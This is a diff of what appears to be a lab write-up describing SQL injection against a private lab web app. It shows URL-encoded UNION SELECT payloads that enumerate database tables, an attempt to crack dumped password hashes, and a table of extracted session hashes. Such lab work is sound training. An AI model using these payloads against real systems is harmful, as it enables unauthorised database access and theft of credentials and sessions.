@@ -44,3 +44,21 @@ http://192.168.56.108/node13/?criteria=%20%27)%20UNION%20SELECT%20table_schema,%
 
 Based on the results of this command, I was given information into the different tables in the database and there was mentions of a hackers table with id, password, and uploads. There was also a table sessions that had id, hacker id. 
 ![SQL Tables](./Screenshots/sqltables.png)
+
+I used this command to querie the hackers table and I was able to see the used id and hashed passwords for all users, however even after using the hash cracker the passwords did not work. http://192.168.56.108/node13/?criteria=%20%27)%20UNION%20SELECT%20null,%20CONCAT(table_schema,%27%20%27,%20table_name),%20column_name%20from%20information_schema.columns; 
+
+I then ran a different command to querie the session table instead and I was able to see the hashed session numbers for all users including user 5 and 8.
+
+|Hash | Session|
+|--------|--------|
+|5a4269fa451889eefcd255f3addc3e3b| A681
+|7e69f3cbeccb8a05feb3be1bd81e84fa| A398
+|0035d41f977e4814921e3f642307eb93| A474
+|17a256d8b54f52f8029ccdb1ca52e426| A247
+|3207334d535a4de66a1a48b652cea0e4| A611
+|f44c4c0c7c34124f906a229908d56a01| A699
+|f3d259d3a861c613c90874fec9b428a9| A206
+|f1ccfe316ed346d19c1865e5134d631c| A154
+|7946287226fc8b91547c38d913122608| A177
+|4c49c58b56a1a311df7a57896664eb24| A986
+|2f72e4f4112efeb63b9fb0ed1eefd1c9| A250
